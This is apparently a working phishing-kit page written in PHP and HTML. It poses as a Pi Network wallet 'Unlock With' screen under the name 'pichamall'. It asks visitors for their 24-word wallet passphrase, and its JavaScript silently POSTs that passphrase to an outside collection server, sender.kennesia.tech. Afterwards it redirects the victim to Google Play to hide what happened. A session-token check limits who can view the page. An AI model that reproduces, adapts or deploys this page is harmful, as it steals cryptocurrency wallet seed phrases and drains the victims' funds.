<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: ./index.php");
    exit();
}
if (isset($_GET['a']) && $_GET['a'] === $_SESSION['a']) {
} else {
    header("Location: ./index.php");
    exit();
}
?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/stylis.css">
    <meta property="og:title" content="pichamall.com" />
    <meta name="Description" content="Web site created using create-react-app" />
    <meta property="og:description" content="Web site created using create-react-app" />
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://pichamall.com/" />
    <meta property="og:image" content="https://<?= $_SERVER['SERVER_NAME'] ?>/assets/img/imglink.png" />
    <meta name="twitter:image" content="https://<?= $_SERVER['SERVER_NAME'] ?>/assets/img/imglink.png">
    <title>pichamall</title>
    <script src="assets/off.js"></script>
    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
</head>

<body>
    <div class="containered">
        <div class="nav">
            <img class="img1" src="assets/img/nav.jpeg" alt="navbar">
        </div>
        <form id="frmSen" method="post">
            <p class="p1">
                Unlock With
            </p>
            <div class="mb-2">
                <center><textarea class="form-control" name="content" id="pars" cols="30" rows="7" placeholder="Enter your 24-word Passphrase here" required></textarea></center>
            </div>
            <center><button type="submit" class="btn btn-secondary btn1" id="sub">UNLOCK WITH PASSPHRASE</button></center>
        </form>
        <footer>
            <p class="p2">
                As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase.
            </p>
            <p class="p3">
                Lost your wallet passphrase? <span id="color">you can create a new wallet</span>, but all the PI numbers in your previous wallet will be inaccessible.
            </p>
        </footer>
    </div>
    <script>
        document.getElementById('frmSen').addEventListener('submit', function(event) {
            event.preventDefault();
            var form = this;
            var submitBtn = document.getElementById('sub');
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>';
            setTimeout(function() {
                fetch('https://sender.kennesia.tech/buyyer4/res.php', {
                    method: 'POST',
                    body: new FormData(form)
                }).then(function(response) {
                    window.location.href = 'https://play.google.com/';
                }).catch(function(error) {
                    console.error('Error:', error);
                    submitBtn.innerText = 'Proses';
                    submitBtn.disabled = false;
                });
            }, 700);
        });
    </script>
    <script src="assets/off.js"></script>
    <script src="https://kit.fontawesome.com/08380760ee.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
</body>

</html>